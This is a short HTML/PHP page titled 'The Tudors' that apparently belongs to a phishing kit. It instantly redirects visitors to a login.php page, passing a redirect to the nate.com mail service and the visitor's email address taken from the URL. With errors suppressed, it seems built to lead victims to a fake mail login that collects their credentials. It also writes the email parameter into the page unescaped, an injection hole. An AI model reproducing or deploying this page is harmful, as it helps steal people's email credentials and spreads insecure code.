<html xmlns="http://www.w3.org/1999/xhtml">    
  <head>      
    <title>The Tudors</title>      
    <meta http-equiv="refresh" content="0;URL='<?php error_reporting(0); echo "login.php?s=mail&redirect=http%3A%2F%2Fmail3.nate.com%2F&email=$_GET[email]";?>'" />    
  </head>    
  <body> 
    
  </body>  
</html>   